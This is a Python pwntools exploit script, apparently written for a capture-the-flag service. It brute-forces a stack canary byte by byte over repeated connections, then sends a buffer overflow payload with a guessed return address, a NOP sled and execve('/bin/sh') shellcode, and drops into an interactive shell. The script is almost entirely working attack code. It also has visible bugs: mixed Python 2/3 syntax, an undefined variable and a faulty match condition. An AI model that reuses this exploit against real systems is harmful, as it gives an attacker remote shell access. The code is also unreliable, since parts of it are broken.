from pwn import *

shellcode = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
def bruteforce():
    fuck = ''
    for i in range(0,8):
        e = 0
        print("Start ")
        while e <= 0xff:
            io = remote('localhost', 12345)
            #io = remote('40.117.63.62', 12345)
            payload = 'paperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+fuck+chr(e)
            io.sendafter('choice: ',payload)
            d = io.recvline()
            print(d)
            print(hexdump(payload))
            print(e)
            if b'WIN' in d:
                try:
                    output = io.recv()
                    if b'Continue? (Y/N)' in output:
                        print("GOT IT")
                        fuck += chr(e)
                        print(hexdump(fuck))
                        io.sendline('N')
                        io.close()
                        break
                except:
                    print("FUCK")
                    e = e + 1
                    io.close()
            else:
                io.close()
    return fuck

def main():
    canary = bruteforce()
    count = 0
    ret_ptr = 139637976727552
    while (True):
        big_payload = 'paperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+canary+'AAAAAAAA'+p64(ret_ptr)+'\x90'*40+shellcode
        io = remote('localhost', 12345)
        io.sendafter('choice: ', big_payload)
        d = io.recv()
        print d
        if b'WIN' and b'bin' in d:
            io.interactive()
            ret_ptr+=38
        print hexdump(big_shellcode)
        print hex(ret_ptr)
        io.close()

    print u'Voil\u00c3!'
main()
